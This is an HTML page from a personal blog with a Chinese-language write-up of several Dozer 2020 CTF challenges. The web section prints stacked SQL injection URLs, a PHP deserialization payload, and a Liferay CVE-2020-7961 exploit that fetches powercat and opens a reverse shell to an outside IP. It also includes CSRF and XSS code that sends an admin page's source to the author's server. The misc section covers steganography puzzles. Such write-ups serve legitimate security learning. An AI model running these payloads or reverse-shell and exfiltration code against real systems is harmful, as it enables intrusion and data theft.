@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+<meta name="google-site-verification" content="fQ_tfBgNjE9NQcpKnGAkWapHoKuimF5lVuNuqpPXar0">
+    <meta charset="utf-8">
+    
+    <title>Dozer 2020 CTF部分Write up | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search">
+		</div>
+	</div>
+</form>
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="" target="_blank">友情链接</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.redmango.top/" target="_blank">HhhM</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://l1near.top/" target="_blank">L1nearのspace</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+
+<div class="m-header" id="headers" >
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      Dozer 2020 CTF部分Write up
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="sqli-labs-0"><a href="#sqli-labs-0" class="headerlink" title="sqli-labs 0"></a>sqli-labs 0</h3><ul>
+<li>一开始也不知道咋做后面看了Hint提示url二次编码。发现单引号是url二次编码绕过。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200614220108.png" alt="20200614220108"></p>
+<ul>
+<li>但是一些关键字如select、union等被过滤了。尝试内联注释、注释、&lt;&gt;等绕过方法无果。后尝试堆叠注入发现成功。</li>
+</ul>
+<pre><code class="http">http://118.31.11.216:30501/?id=1%2527;show%20tables;--+</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200614220443.png" alt="20200614220443"></p>
+<ul>
+<li>想起了令人深刻的强网杯随便注。老套路查字段。</li>
+</ul>
+<pre><code class="http">http://118.31.11.216:30501/?id=1%2527;show%20columns%20from%20uziuzi;--+</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200614220846.png" alt="20200614220846"></p>
+<ul>
+<li>预处理查询数据库内容，这里卡了一会，直接拼接字符串没法执行，所以把字符串转16进制再执行，还有prepare、set这里做了过滤和强网杯一样，利用大小写不敏感直接绕过,直接得到flag.</li>
+</ul>
+<pre><code class="http">http://118.31.11.216:30501/?id=0%2527%20;set%20@sql%20=0x73656c6563742a66726f6d60757a69757a6960;Prepare%20stmt%20from%20@sql;EXECUTE%20stmt;--+</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200614221253.png" alt="20200614221253"></p>
+<h3 id="白给的反序列化"><a href="#白给的反序列化" class="headerlink" title="白给的反序列化"></a>白给的反序列化</h3><ul>
+<li>一开始没看题，一直去读<code>/flag</code>导致卡了一下,没啥绕过的，主要要改写一下payload，由于使用<code>private</code>，会导致生成的payload有&lt;0x00&gt;所以需要绕过一下，而且服务器的php版本是php5.59，没法直接改成public绕过，所以需要吧s改成S（这样能识别16进制的<code>%00</code>）,把&lt;0x00&gt;替换为<code>\00</code>.</li>
+</ul>
+<pre><code>http://118.31.11.216:30600/?path=O:4:%22home%22:2:{S:12:%22\00home\00method%22;s:5:%22mysys%22;S:10:%22\00home\00args%22;a:1:{i:0;s:8:%22flag.php%22;}}</code></pre><ul>
+<li>EXP</li>
+</ul>
+<pre><code class="php"> &lt;?php
+
+class home
+{
+    private $method;
+    private $args;
+    function __construct($method, $args)
+    {
+        $this-&gt;method = $method;
+        $this-&gt;args = $args;
+    }
+
+}
+
+$o = new home(&quot;mysys&quot;,[&#39;flag.php&#39;]);
+echo serialize($o);
+?&gt;</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200614222456.png" alt="20200614222456"></p>
+<h3 id="简单域渗透-flag1"><a href="#简单域渗透-flag1" class="headerlink" title="简单域渗透-flag1"></a>简单域渗透-flag1</h3><ul>
+<li><p>这道题抢了2血，看到界面就知道了是最近的<strong>CVE-2020-7961 Liferay Portal</strong></p>
+</li>
+<li><p>先搞个EXP,用powershell反弹一个shell到服务器：</p>
+</li>
+</ul>
+<pre><code class="java">public class LifExp {
+static {
+try {
+String[] cmd = {&quot;cmd.exe&quot;, &quot;/c&quot;, &quot;powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;); powercat -c 39.107.126.173 -p 25565 -e cmd&quot;};
+
+java.lang.Runtime.getRuntime().
+exec(cmd).waitFor();
+} catch ( Exception e ) {
+e.printStackTrace();
+}
+}
+}</code></pre>
+<ul>
+<li>编译成class放服务器上。</li>
+</ul>
+<pre><code class="shell">javac .\LifExp.java</code></pre>
+<ul>
+<li>用marshalsec生成payload</li>
+</ul>
+<pre><code class="shell">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://39.107.126.173/ LifExp</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614224615.png" alt="微信截图_20200614224615"></p>
+<ul>
+<li>发送数据包</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/0200614225038.png" alt="0200614225038"></p>
+<ul>
+<li>反弹shell后，flag在桌面的flag.txt</li>
+</ul>
+<h3 id="fake-phpminiadmin"><a href="#fake-phpminiadmin" class="headerlink" title="fake phpminiadmin"></a>fake phpminiadmin</h3><ul>
+<li>这道题拿了3血。题目提示是一个前端漏洞，前端漏洞也就csrf、xss了。nc监听，给网站交一个我们的链接看看：</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614230021.png" alt="微信截图_20200614230021"></p>
+<ul>
+<li>看到<code>admin_shark.php</code>,不用想了肯定flag就在这个页面了，我们要做的就是把这个页面的源码窃取到。在线上打开这个也印证了这点：</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614230157.png" alt="微信截图_20200614230157"></p>
+<ul>
+<li>这里是一个类似phpmyadmin的东西，查询时候能直接打印出字符串，这样我们就能够构造一个xss去窃取<code>admin_shark.php</code> 页面源码，但是<code>sql.php</code> 需要POST提交无法直接提交这个链接给后台管理员，所以需要构造一个自动提交的表单来csrf触发这个xss.思路很简单了。画个图说明一下：</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614230931.png" alt="微信截图_20200614230931"></p>
+<ul>
+<li>这里插入xss到数据库需要注意做了简单的过滤，只需将payload转16进制再<code>unhex</code> 转回来就行了，不过这我是搭了一血的车，我直接把他的xss地址换成我的了：</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200614231135.png" alt="微信图片_20200614231135"></p>
+<ul>
+<li>构造自动查询表单来触发csrf,exp.html</li>
+</ul>
+<pre><code class="html">&lt;html&gt;
+  &lt;body&gt;
+  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;
+    &lt;form name=&quot;exp&quot; action=&quot;http://127.0.0.1/sql.php&quot; method=&quot;POST&quot;&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;sql&quot; value=&quot;select * from p1g3&quot; /&gt;
+
+    &lt;/form&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+document.exp.submit()
+&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>构造获取页面源码的xss</li>
+</ul>
+<pre><code class="javascript">function createXmlHttp() {
+    if (window.XMLHttpRequest) {
+        xmlHttp = new XMLHttpRequest()
+    } else {
+        var MSXML = new Array(&#39;MSXML2.XMLHTTP.5.0&#39;, &#39;MSXML2.XMLHTTP.4.0&#39;, &#39;MSXML2.XMLHTTP.3.0&#39;, &#39;MSXML2.XMLHTTP&#39;, &#39;Microsoft.XMLHTTP&#39;);
+        for (var n = 0; n &lt; MSXML.length; n++) {
+            try {
+                xmlHttp = new ActiveXObject(MSXML[n]);
+                break
+            } catch(e) {}
+        }
+    }
+}
+createXmlHttp();
+xmlHttp.onreadystatechange = function(){
+  if (xmlHttp.readyState == 4) {
+        code=escape(xmlHttp.responseText);
+        createXmlHttp();
+        url = &quot;http://39.107.126.173:8080/re.php&quot;;   //这里是我们服务器接受的地址
+        cc = &quot;htmlcode=&quot; + code +&quot;&amp;filename=index.html&quot;;
+        xmlHttp.open(&quot;POST&quot;, url, true);
+        xmlHttp.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+        xmlHttp.send(cc)
+  }
+};
+xmlHttp.open(&quot;GET&quot;, &quot;/admin_shark.php&quot;, true);//这块填写获得的后台地址。
+xmlHttp.setRequestHeader(&quot;Referer&quot;, &quot;http://127.0.0.1/&quot;);
+xmlHttp.send(null);</code></pre>
+<ul>
+<li>接收页面源码的exp：</li>
+</ul>
+<pre><code class="php">&lt;?php
+        function js_unescape($str) {
+                $ret = &#39;&#39;;
+                $len = strlen($str);
+                for ($i = 0;$i &lt; $len;$i++) {
+                        if ($str[$i] == &#39;%&#39; &amp;&amp; $str[$i + 1] == &#39;u&#39;) {
+                                $val = hexdec(substr($str, $i + 2, 4));
+                                if ($val &lt; 0x7f) $ret.= chr($val);
+                                else if ($val &lt; 0x800) $ret.= chr(0xc0 | ($val &gt;&gt; 6)) . chr(0x80 | ($val &amp; 0x3f));
+                                else $ret.= chr(0xe0 | ($val &gt;&gt; 12)) . chr(0x80 | (($val &gt;&gt; 6) &amp; 0x3f)) . chr(0x80 | ($val &amp; 0x3f));
+                                $i+= 5;
+                        } else if ($str[$i] == &#39;%&#39;) {
+                                $ret.= urldecode(substr($str, $i, 3));
+                                $i+= 2;
+                        } else $ret.= $str[$i];
+                }
+                return $ret;
+        }
+        $data = js_unescape($_POST[&#39;htmlcode&#39;]);  //对获得源码js_unescape解码。
+        $filename = $_POST[&#39;filename&#39;] . date(&quot;y-m-d-h-i-s&quot;) . &quot;.html&quot;;
+        $myfile = fopen($filename, &quot;w&quot;);
+        fwrite($myfile, $data);
+        fclose($myfile);
+?&gt;</code></pre>
+<ul>
+<li>这样我们在提交url给后台时候就会自动跳转的sql.php触发xss窃取<code>admin_shark.php</code>的源码,源码会保存在我们的服务器中。<br><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614231648.png" alt="微信截图_20200614231648"></li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200614231558.png" alt="微信图片_20200614231558"></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="py吗？"><a href="#py吗？" class="headerlink" title="py吗？"></a>py吗？</h3><ul>
+<li>一张老外穿着python文化衫的图片。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/py.png" alt="py"></p>
+<ul>
+<li>修一下高度让他恢复正常的crc32校验以便其他软件能够打开：</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614231934.png" alt="微信截图_20200614231934"></p>
+<ul>
+<li>国际惯例：Stegsolve-&gt;Analyse-&gt;Data Extract</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614232301.png" alt="微信截图_20200614232301"></p>
+<ul>
+<li>发现base64，解码得到flag.</li>
+</ul>
+<pre><code>Dozerctf{python_is_the_best_language!}</code></pre><h3 id="夏日计划"><a href="#夏日计划" class="headerlink" title="夏日计划"></a>夏日计划</h3><ul>
+<li>下载下来按照国际惯例010打开，发现是一个RAR压缩文件</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/QQ%E5%9B%BE%E7%89%8720200614232519.png" alt="QQ图片20200614232519"></p>
+<ul>
+<li>直接解压会发现少几个文件，所以直接从里面拉出来就行了</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/QQ%E5%9B%BE%E7%89%8720200614232702.png" alt="QQ图片20200614232702"></p>
+<ul>
+<li>会发现secret.rar是损坏的，所以直接用winrar修复会发现里面有四个文件，里面的内容全是两两相对，非常像坐标。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614232958.png" alt="微信截图_20200614232958"></p>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614233025.png" alt="微信截图_20200614233025"></p>
+<ul>
+<li>而且，这些坐标正好是一个X长度为140，Y的长度为140的平面直角坐标系，一个正方形不用猜都能想到是一个二维之类的的东西了，于是乎kail linux启动用 <code>gnuplot</code>把四个文件合成一个qt.txt，生成一个二维试试看</li>
+</ul>
+<pre><code class="shell">root@kali:~/桌面# gnuplot
+
+        G N U P L O T
+        Version 5.2 patchlevel 8    last modified 2019-12-01 
+
+        Copyright (C) 1986-1993, 1998, 2004, 2007-2019
+        Thomas Williams, Colin Kelley and many others
+
+        gnuplot home:     http://www.gnuplot.info
+        faq, bugs, etc:   type &quot;help FAQ&quot;
+        immediate help:   type &quot;help&quot;  (plot window: hit &#39;h&#39;)
+
+Terminal type is now &#39;qt&#39;
+gnuplot&gt; plot &quot;qt.txt&quot;
+qt5ct: using qt5ct plugin
+gnuplot&gt; 
+</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614233644.png" alt="微信截图_20200614233644"></p>
+<ul>
+<li>刚刚在网鼎杯被虐完，怎么可能不知道这是一个汉信码。photoshop,去色，反相，拉曲线，作为一名<code>CTF患者</code>怎么可能不会PS?,于是得到一张汉信码。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/HXcode.gif" alt="HXcode"></p>
+<ul>
+<li>这里一定要吐槽一下，全网识别这个东西的网站就一个。。。今天它还蹦了，汉信码官网识别不了汉码官网生成的汉信码。我裂开了，最后找出题的师傅提供了<code>解题过程</code>，解决了。。。。万分感谢。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614234121.png" alt="微信截图_20200614234121"></p>
+<h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><ul>
+<li>填问卷</li>
+</ul>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2020-06-15T06:44:53.000Z" itemprop="datePublished">2020-06-15</time>
+	</div>
+</article>
+<!-- 目录内容 -->
+<div id='maktoc'>
+
+    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+          <span class="btn-bg"></span>
+          <span class="btn-text">文章导航</span>
+          </p>
+    <div id="toc-article" class="toc-article">
+        <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+        <strong class="toc-title">文章目录</strong>
+           <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-labs-0"><span class="toc-number">1.1.</span> <span class="toc-text">sqli-labs 0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#白给的反序列化"><span class="toc-number">1.2.</span> <span class="toc-text">白给的反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单域渗透-flag1"><span class="toc-number">1.3.</span> <span class="toc-text">简单域渗透-flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fake-phpminiadmin"><span class="toc-number">1.4.</span> <span class="toc-text">fake phpminiadmin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#py吗？"><span class="toc-number">2.1.</span> <span class="toc-text">py吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#夏日计划"><span class="toc-number">2.2.</span> <span class="toc-text">夏日计划</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#问卷调查"><span class="toc-number">2.3.</span> <span class="toc-text">问卷调查</span></a></li></ol></li></ol>
+         </div>
+   <script type="text/javascript">
+    function showToc(){
+        var toc_article = document.getElementById("toc-article");
+        var show_toc_btn = document.getElementById("show-toc-btn");
+        toc_article.setAttribrootute("style","display:block");
+        show_toc_btn.setAttribute("style","display:none");
+        };
+    function showBtn(){
+        var toc_article = document.getElementById("toc-article");
+        var show_toc_btn = document.getElementById("show-toc-btn");
+        toc_article.setAttribute("style","display:none");
+        show_toc_btn.setAttribute("style","display:block");
+        };
+	function getScrollTop() {
+	    var scroll_top = 0;
+	    if (document.documentElement && document.documentElement.scrollTop) {
+		scroll_top = document.documentElement.scrollTop;
+	    }
+	    else if (document.body) {
+		scroll_top = document.body.scrollTop;
+	    }
+	    return scroll_top;
+	};
+	var headers=document.getElementById("headers");
+	var tocs = document.getElementById("toc-article");
+	
+	
+	window.onscroll  = function(){
+	if(getScrollTop()>450){
+			if(tocs.offsetTop>100){
+			var tophight = tocs.offsetTop-15;
+			tocs.style.cssText="top:"+tophight+"px";
+			}
+	}else{
+			tocs.style.cssText="top:540px";
+		}
+				
+		
+		//console.log(getScrollTop());	
+		
+	}
+window.onresize = function(){
+	var mak_toc = document.getElementById("maktoc");
+	if($(window).width()<1414){
+	mak_toc.setAttribute("style","display:none");
+	}else{
+	mak_toc.setAttribute("style","display:block");
+	}
+}
+   </script>
+      
+<!-- 目录内容结束 -->
+</div>
+
+<!--评论-->
+
+	
+<div id="lv-container" data-id="city" data-uid="MTAyMC80OTc4Mi8yNjI3Mw==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>兵至如归-Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+							
+							<li>
+				        		<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">
+				        			
+				        				<i class="iconfont icon-weixin"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<footer class="footer" role="contentinfo">
+
+	<div class="wrapper wrapper--wide split split--responsive">
+<a href="http://beian.miit.gov.cn/">粤ICP备18132442号-1</a><br>
+<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="/gongan.png" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">粤公网安备 44011202000643号</p></a><br>
+
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="https://github.com/justpsvm">justpsvm</a>. Powered by <a href="https://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+ <script type="text/javascript"> /* 鼠标点击特效 - 7Core.CN */ var a_idx = 0;jQuery(document).ready(function($) {$("body").click(function(e) {var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");var $i = $("<span/>").text(a[a_idx]); a_idx = (a_idx + 1) % a.length;var x = e.pageX,y = e.pageY;$i.css({"z-index": 100000000,"top": y - 20,"left": x,"position": "absolute","font-weight": "bold","color": "#ff6651"});$("body").append($i);$i.animate({"top": y - 180,"opacity": 0},1500,function() {$i.remove();});});}); </script>
+
